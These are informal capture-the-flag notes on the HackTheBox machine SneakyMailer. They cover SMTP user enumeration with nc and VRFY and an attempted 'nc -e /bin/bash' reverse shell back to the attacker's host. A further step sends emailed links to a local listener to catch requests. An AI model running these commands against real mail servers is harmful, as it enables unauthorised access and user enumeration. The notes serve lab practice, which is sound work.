add sneakycorp.htb to /etc/hosts with its ip address

verify emails exist using the port using:

```
nc 10.10.10.197 25
```
and then

```
vrfy laelgreer@sneakymailer.htb

```

try smtp enumeration using this: https://www.hackingarticles.in/4-ways-smtp-enumeration/ and fail
try sending mails using this syntax and try to get a reverse shell using ```nc -e /bin/bash yourip port (nc -vlp on the attacker side) ```

reverse shell doesnt work but putting nc on port 80 would make it a simple http request, and u can send it via browser and try sending it mails,
test it on ur local by oopening a browser and typing http://localhost
